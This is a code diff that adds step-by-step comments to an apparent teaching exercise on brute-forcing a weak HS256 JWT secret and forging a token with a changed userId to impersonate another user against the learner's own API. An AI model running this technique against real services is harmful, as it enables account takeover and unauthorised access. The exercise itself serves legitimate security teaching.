@@ -1,5 +1,12 @@
 import crypto from "crypto";
 
+/**
+ * 1st: generate a token on your API by doing a signin (check your cookies to find the token)
+ */
+
+/**
+ * 2nd: use jwt.io to decode your token and copy/paste JSON information bellow (both header and payload)
+ */
 const header = {
   alg: "HS256",
   typ: "JWT",
@@ -15,8 +22,14 @@ const payloadB64Url = Buffer.from(JSON.stringify(payload)).toString(
   "base64url"
 );
 
+/**
+ * 3rd: you may check that this log match the beginning of your JWT!
+ */
 console.log(`Token starts with: ${headerB64Url}.${payloadB64Url}`);
 
+/**
+ * 4th: it's your moment to shine! Wirte an algo to generate all possible string combination (from 1 to 4 chars for intance)
+ */
 // you should generate this! Good luck!
 const potentialSecretKeys = ["a", "b", "c", "...", "sst!"];
 
@@ -29,6 +42,9 @@ for (const potentialSecretKey of potentialSecretKeys) {
     .update(`${headerB64Url}.${payloadB64Url}`)
     .digest("base64url");
 
+  /**
+   * 5th: replace this string with the signature part of your JWT
+   */
   if (hash === "7t6J53lEhRcIUOgFxvR_kXZzd_eYdqeXna3dN0fD908") {
     console.log(`Bingo, secret key is ${potentialSecretKey}`);
     secretKey = potentialSecretKey;
@@ -45,6 +61,9 @@ if (secretKey !== undefined) {
     "base64url"
   );
 
+  /**
+   * 6th: change the userId bellow to fake someone identity!
+   */
   const payload = {
     exp: 1715705567,
     userId: 2,
@@ -59,5 +78,8 @@ if (secretKey !== undefined) {
     .update(`${headerB64Url}.${payloadB64Url}`)
     .digest("base64url");
 
-  console.log(`Token is : ${headerB64Url}.${payloadB64Url}.${hash}`);
+  /**
+   * 7th: finally you may try to call your API by playing this forged token to make some pretected calls (use Postman for instance)
+   */
+  console.log(`Token is: ${headerB64Url}.${payloadB64Url}.${hash}`);
 }
